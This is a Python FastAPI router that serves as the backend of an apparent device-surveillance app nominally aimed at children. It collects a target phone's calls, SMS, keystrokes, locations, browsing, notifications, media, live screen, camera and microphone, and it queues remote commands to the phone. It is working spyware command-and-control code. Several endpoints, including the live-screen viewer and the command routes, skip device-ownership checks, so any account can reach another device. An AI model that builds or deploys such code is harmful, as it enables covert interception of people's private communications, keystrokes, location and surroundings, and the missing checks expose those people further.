from fastapi import APIRouter, Depends, HTTPException, File, UploadFile, Form, Response
import time
import shutil
import os
import uuid
from typing import List, Optional
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.orm import Session
from . import schemas
from app.db import crud, models, database
from app.db.database import get_db
from app.core import security
from app.core.auth import get_current_user, get_current_device
security.get_current_user = get_current_user
security.verify_device_token = get_current_device
security.get_current_device = get_current_device
from datetime import timedelta
from app.core.config import settings
from app.services import r2_service
from sqlalchemy.sql import func

router = APIRouter()

@router.post("/users/", response_model=schemas.User)
def create_user(user: schemas.UserCreate, db: Session = Depends(get_db)):
    db_user = crud.get_user_by_email(db, email=user.email)
    if db_user:
        raise HTTPException(status_code=400, detail="Email already registered")
    return crud.create_user(db=db, user=user)

@router.post("/token", response_model=schemas.Token)
def login_for_access_token(db: Session = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()):
    user = crud.get_user_by_email(db, email=form_data.username)
    if not user or not security.verify_password(form_data.password, user.hashed_password):
        raise HTTPException(
            status_code=401,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = security.create_access_token(
        data={"sub": user.email}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}

@router.get("/users/me", response_model=schemas.User)
def read_users_me(current_user: models.User = Depends(get_current_user)):
    return current_user

# Device Endpoints
@router.delete("/devices/{device_id}")
def delete_device(device_id: int, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
    db_device = db.query(models.Device).filter(models.Device.id == device_id, models.Device.owner_id == current_user.id).first()
    if not db_device: raise HTTPException(status_code=404, detail="Device not found")
    db.delete(db_device)
    db.commit()
    return {"detail": "Device deleted"}

@router.get("/devices/{device_id}", response_model=schemas.Device)
def read_device(device_id: int, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
    db_device = db.query(models.Device).filter(models.Device.id == device_id, models.Device.owner_id == current_user.id).first()
    if not db_device: raise HTTPException(status_code=404, detail="Device not found")
    return db_device

@router.get("/devices/me/", response_model=schemas.Device)
def read_device_me(current_device: models.Device = Depends(get_current_device)):
    return current_device

@router.post("/devices/register", response_model=schemas.Device)
def register_device(
    device: schemas.DeviceCreate,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_user)
):
    # Check if a device with the same name/model already exists for this user
    existing_devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
    for d in existing_devices:
        if device.name and device.model and d.name == device.name and d.model == device.model:
            return d

    return crud.create_device(db=db, device=device, user_id=current_user.id)

@router.get("/devices/", response_model=List[schemas.Device])
def read_devices(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_user)
):
    return crud.get_devices_by_user(db=db, user_id=current_user.id)

@router.patch("/devices/heartbeat", response_model=schemas.Device)
def device_heartbeat(
    update: schemas.DeviceUpdate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    return crud.update_device_heartbeat(db=db, device_id=current_device.id, battery_level=update.battery_level)

@router.get("/users/me/call_logs/", response_model=List[schemas.CallLog])
def read_call_logs_for_user(
    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
):
    if device_id:
        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
        if not any(d.id == device_id for d in devices):
            raise HTTPException(status_code=403, detail="Device not owned by user")
        return crud.get_call_logs_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
    return crud.get_call_logs_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)

@router.get("/users/me/sms_messages/", response_model=List[schemas.SmsMessage])
def read_sms_messages_for_user(
    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
):
    if device_id:
        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
        if not any(d.id == device_id for d in devices):
            raise HTTPException(status_code=403, detail="Device not owned by user")
        return crud.get_sms_messages_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
    return crud.get_sms_messages_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)

@router.get("/users/me/app_usage/", response_model=List[schemas.AppUsage])
def read_app_usage_for_user(
    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
):
    if device_id:
        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
        if not any(d.id == device_id for d in devices):
            raise HTTPException(status_code=403, detail="Device not owned by user")
        return crud.get_app_usage_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
    return crud.get_app_usage_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)

@router.get("/users/me/web_activity/", response_model=List[schemas.WebActivity])
def read_web_activity_for_user(
    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
):
    if device_id:
        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
        if not any(d.id == device_id for d in devices):
            raise HTTPException(status_code=403, detail="Device not owned by user")
        return crud.get_web_activity_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
    return crud.get_web_activity_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)

@router.get("/users/me/installed_apps/", response_model=List[schemas.InstalledApp])
def read_installed_apps_for_user(
    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
):
    if device_id:
        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
        if not any(d.id == device_id for d in devices):
            raise HTTPException(status_code=403, detail="Device not owned by user")
        return crud.get_installed_apps_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
    return crud.get_installed_apps_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)

@router.get("/users/me/notifications/", response_model=List[schemas.Notification])
def read_notifications_for_user(
    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
):
    if device_id:
        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
        if not any(d.id == device_id for d in devices):
            raise HTTPException(status_code=403, detail="Device not owned by user")
        return crud.get_notifications_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
    return crud.get_notifications_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)

@router.get("/users/me/locations/", response_model=List[schemas.Location])
def read_locations_for_user(
    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
):
    if device_id:
        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
        if not any(d.id == device_id for d in devices):
            raise HTTPException(status_code=403, detail="Device not owned by user")
        return crud.get_locations_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
    return crud.get_locations_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)

@router.get("/users/me/keylogs/", response_model=List[schemas.Keylog])
def read_keylogs_for_user(
    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
):
    if device_id:
        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
        if not any(d.id == device_id for d in devices):
            raise HTTPException(status_code=403, detail="Device not owned by user")
        return crud.get_keylogs_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
    return crud.get_keylogs_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)

# Device Telemetry Endpoints (for Child App)
@router.post("/devices/me/call_logs/", response_model=schemas.CallLog)
def create_call_log_for_device(
    call_log: schemas.CallLogCreate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    call_log.device_id = current_device.id
    return crud.create_user_call_log(db=db, call_log=call_log, user_id=current_device.owner_id)

@router.post("/devices/me/sms_messages/", response_model=schemas.SmsMessage)
def create_sms_message_for_device(
    sms_message: schemas.SmsMessageCreate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    sms_message.device_id = current_device.id
    return crud.create_user_sms_message(db=db, sms_message=sms_message, user_id=current_device.owner_id)

@router.post("/devices/me/app_usage/", response_model=schemas.AppUsage)
def create_app_usage_for_device(
    app_usage: schemas.AppUsageCreate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    app_usage.device_id = current_device.id
    return crud.create_user_app_usage(db=db, app_usage=app_usage, user_id=current_device.owner_id)

@router.post("/devices/me/web_activity/", response_model=schemas.WebActivity)
def create_web_activity_for_device(
    web_activity: schemas.WebActivityCreate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    web_activity.device_id = current_device.id
    return crud.create_user_web_activity(db=db, web_activity=web_activity, user_id=current_device.owner_id)

@router.post("/devices/me/installed_apps/", response_model=schemas.InstalledApp)
def create_installed_app_for_device(
    installed_app: schemas.InstalledAppCreate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    installed_app.device_id = current_device.id
    return crud.create_user_installed_app(db=db, installed_app=installed_app, user_id=current_device.owner_id)

@router.post("/devices/me/notifications/", response_model=schemas.Notification)
def create_notification_for_device(
    notification: schemas.NotificationCreate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    notification.device_id = current_device.id
    return crud.create_user_notification(db=db, notification=notification, user_id=current_device.owner_id)

@router.post("/devices/me/locations/", response_model=schemas.Location)
def create_location_for_device(
    location: schemas.LocationCreate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    location.device_id = current_device.id
    return crud.create_user_location(db=db, location=location, user_id=current_device.owner_id)

@router.get("/devices/me/commands/", response_model=List[schemas.Command])
def get_device_commands(db: Session = Depends(get_db), current_device: models.Device = Depends(get_current_device)):
    return crud.get_pending_commands_by_device(db=db, device_id=current_device.id)

@router.patch("/commands/{command_id}/status", response_model=schemas.Command)
def update_command_status(command_id: int, update: schemas.CommandStatusUpdate, db: Session = Depends(get_db), current_device: models.Device = Depends(get_current_device)):
    return crud.update_command_status(db=db, command_id=command_id, update=update)

@router.post("/devices/me/media/upload/", response_model=schemas.MediaFile)
def upload_media(file: UploadFile = File(...), db: Session = Depends(get_db), current_device: models.Device = Depends(get_current_device)):
    # fake upload
    filename = f"{uuid.uuid4()}_{file.filename}"
    file_path = os.path.join("static", filename)
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    media = schemas.MediaFileCreate(s3_key=filename, file_type=file.content_type, device_id=current_device.id)
    return crud.create_media_file(db=db, media=media, user_id=current_device.owner_id)

@router.post("/devices/{device_id}/commands/", response_model=schemas.Command)
def send_command(device_id: int, command: schemas.CommandBase, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
    cmd_create = schemas.CommandCreate(**command.dict(), device_id=device_id)
    return crud.create_command(db=db, command=cmd_create, user_id=current_user.id)

@router.post("/media/presigned-put", response_model=schemas.PresignedPutResponse)
def get_presigned_put(req: schemas.PresignedPutRequest, current_device: models.Device = Depends(security.get_current_device)):
    safe_filename = os.path.basename(req.file_name)
    key = f"devices/{current_device.id}/{uuid.uuid4()}_{safe_filename}"
    url = r2_service.generate_presigned_put(key, req.file_type)
    return {"upload_url": url, "s3_key": key}

@router.post("/media/complete", response_model=schemas.MediaFileResponse)
def complete_media_upload(req: schemas.MediaFileBase, db: Session = Depends(database.get_db), current_device: models.Device = Depends(security.get_current_device)):
    media_create = schemas.MediaFileCreate(**req.dict(), device_id=current_device.id)
    return crud.create_media_file(db, media_create, current_device.owner_id)

@router.get("/devices/{device_id}/media", response_model=List[schemas.MediaFileResponse])
def list_device_media(device_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(database.get_db), current_user: models.User = Depends(security.get_current_user)):
    device = db.query(models.Device).filter(models.Device.id == device_id, models.Device.owner_id == current_user.id).first()
    if not device:
        raise HTTPException(status_code=403, detail="Not authorized to access media for this device")
    items = crud.get_media_by_device(db, device_id, skip=skip, limit=limit)
    res = []
    for m in items:
        validate_fn = getattr(schemas.MediaFileResponse, "model_validate", getattr(schemas.MediaFileResponse, "from_orm", None))
        m_dict = validate_fn(m)
        m_dict.url = r2_service.generate_presigned_get(m.s3_key)
        res.append(m_dict)
    return res

@router.post("/devices/me/keylogs/", response_model=schemas.Keylog)
def create_keylog_for_device(
    keylog: schemas.KeylogCreate,
    db: Session = Depends(get_db),
    current_device: models.Device = Depends(get_current_device)
):
    keylog.device_id = current_device.id
    return crud.create_user_keylog(db=db, keylog=keylog, user_id=current_device.owner_id)

@router.post("/commands", response_model=schemas.CommandResponse)
def enqueue_command(
    cmd_req: schemas.CommandCreateRequest,
    db: Session = Depends(database.get_db),
    current_user: models.User = Depends(security.get_current_user)
):
    cmd = models.Command(
        device_id=cmd_req.device_id,
        command=cmd_req.command,
        status="pending",
        created_at=int(time.time() * 1000)
    )
    db.add(cmd)
    db.commit()
    db.refresh(cmd)
    return cmd

@router.post("/live-screen")
def upload_live_screen_frame(
    file: UploadFile = File(...),
    timestamp: int = Form(...),
    db: Session = Depends(database.get_db),
    device: models.Device = Depends(security.verify_device_token)
):
    frame_bytes = file.file.read()
    frame = db.query(models.LiveScreenFrame).filter(models.LiveScreenFrame.device_id == device.id).first()
    if not frame:
        frame = models.LiveScreenFrame(device_id=device.id, frame_data=frame_bytes, timestamp=timestamp)
        db.add(frame)
    else:
        frame.frame_data = frame_bytes
        frame.timestamp = timestamp
    db.commit()
    return {"status": "ok"}

@router.get("/live-screen/latest")
def get_latest_live_frame(
    device_id: int,
    db: Session = Depends(database.get_db),
    current_user: models.User = Depends(security.get_current_user)
):
    frame = db.query(models.LiveScreenFrame).filter(models.LiveScreenFrame.device_id == device_id).first()
    if not frame or not frame.frame_data:
        return Response(status_code=404)
    return Response(content=frame.frame_data, media_type="image/jpeg", headers={"X-Frame-Timestamp": str(frame.timestamp)})

latest_camera_frames: dict = {}
latest_audio_chunks: dict = {}

@router.post("/live-camera")
def upload_live_camera_frame(
    file: UploadFile = File(...),
    current_device: models.Device = Depends(security.get_current_device)
):
    data = file.file.read()
    latest_camera_frames[current_device.id] = (data, time.time())
    return {"status": "ok", "size": len(data)}

@router.get("/live-camera/latest")
def get_latest_camera_frame(
    device_id: int,
    db: Session = Depends(database.get_db),
    current_user: models.User = Depends(security.get_current_user)
):
    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
    if not device:
        raise HTTPException(status_code=403, detail="Not authorized")
    entry = latest_camera_frames.get(device_id)
    if not entry:
        raise HTTPException(status_code=404, detail="No camera frame available")
    data, ts = entry
    return Response(content=data, media_type="image/jpeg", headers={"X-Frame-Timestamp": str(ts)})

@router.post("/live-audio")
def upload_live_audio_chunk(
    file: UploadFile = File(...),
    current_device: models.Device = Depends(security.get_current_device)
):
    data = file.file.read()
    latest_audio_chunks[current_device.id] = (data, time.time())
    return {"status": "ok", "size": len(data)}

@router.get("/live-audio/latest")
def get_latest_audio_chunk(
    device_id: int,
    db: Session = Depends(database.get_db),
    current_user: models.User = Depends(security.get_current_user)
):
    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
    if not device:
        raise HTTPException(status_code=403, detail="Not authorized")
    entry = latest_audio_chunks.get(device_id)
    if not entry:
        raise HTTPException(status_code=404, detail="No audio chunk available")
    data, ts = entry
    return Response(content=data, media_type="audio/aac", headers={"X-Frame-Timestamp": str(ts)})

